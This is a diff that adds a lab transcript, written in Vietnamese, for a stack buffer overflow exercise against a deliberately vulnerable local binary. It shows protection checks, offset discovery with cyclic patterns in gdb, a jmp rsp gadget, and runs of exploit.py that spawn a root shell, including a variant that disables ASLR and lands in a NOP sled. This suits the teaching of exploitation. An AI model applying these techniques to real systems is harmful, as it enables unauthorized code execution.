@@ -1,0 +1,63 @@
+### Lab 4.2 transcript ###
+# Moi truong kiem thu THAT:
+#   Ubuntu 24.04.4 LTS, kernel 6.8.0-134-generic
+#   glibc 2.39 (Ubuntu GLIBC 2.39-0ubuntu8.9), gcc 13.3.0, pwntools (venv)
+# Cach jmp rsp: chay lai 8/8 deu lay shell voi ASLR BAT.
+# Cach DIRECT (NOP sled): chay lai deu lay shell voi ASLR TAT.
+
+$ bash build.sh
+[*] built: vuln
+[*] kiem tra GNU_STACK phai la RWE:
+  GNU_STACK      0x000000 ... RWE 0x10
+  GNU_RELRO      0x002df8 ... R   0x1
+
+$ checksec vuln
+RELRO:      Partial RELRO
+Stack:      No canary found
+NX:         NX unknown - GNU_STACK missing
+PIE:        No PIE (0x400000)
+Stack:      Executable
+RWX:        Has RWX segments
+
+### Buoc 1: tim offset bang cyclic ###
+$ python3 -c "from pwn import *; open('pat.txt','wb').write(cyclic(200))"
+$ gdb -q -batch -ex 'run < pat.txt' -ex 'info registers rip rsp' -ex 'x/gx $rsp' ./vuln
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040117e in vuln () at src.c:24
+rip            0x40117e            0x40117e <vuln+47>     ; crash ngay tai lenh ret
+rsp            0x7fffffffea38      0x7fffffffea38
+0x7fffffffea38:	0x6161617461616173                      ; = "saaataaa"
+$ python3 -c "from pwn import *; print(cyclic_find(p64(0x6161617461616173)[:4]))"
+offset = 72
+
+### Buoc 2: jmp rsp gadget ###
+jmp rsp (ff e4) @ 0x40114a
+
+### Buoc 3: khai thac jmp rsp (ASLR = 2, BAT) ###
+$ python3 exploit.py
+[*] gadget jmp rsp @ 0x40114a
+[+] Starting local process './vuln': pid 442323
+[+] Receiving all data: Done (65B)
+===PWNED_4_2===
+uid=0(root) gid=0(root) groups=0(root)
+===END===
+[+] shellcode-on-stack lay shell that
+
+### Phu luc: nhay THANG vao stack khi ASLR TAT (minh hoa) ###
+$ echo 0 > /proc/sys/kernel/randomize_va_space
+$ gdb -q -batch -ex 'break read' -ex 'run < /dev/null' -ex 'printf "&buf=%p\n", $rsi' ./vuln
+Breakpoint 1, __GI___libc_read (fd=0, buf=0x7fffffffe9f0, nbytes=400) ...
+&buf=0x7fffffffe9f0
+$ python3 exploit.py DIRECT BUF=0x7fffffffe9f0
+[*] buf @ 0x7fffffffe9f0, nhay vao giua NOP sled @ 0x7fffffffeac0 (ASLR phai tat)
+[+] Receiving all data: Done (65B)
+===PWNED_4_2===
+uid=0(root) gid=0(root) groups=0(root)
+===END===
+[+] shellcode-on-stack lay shell that
+$ echo 2 > /proc/sys/kernel/randomize_va_space   # khoi phuc
+
+# Ghi chu: lan dau exploit chay chap chon (~50%) vi read(0,buf,400) la greedy,
+# no nuot ca lenh shell gui ngay sau payload trong cung MOT lan doc. Them
+# sleep(0.3) truoc khi go lenh -> on dinh 8/8. Day la cam bay harness, khong
+# phai loi ky thuat jmp rsp.
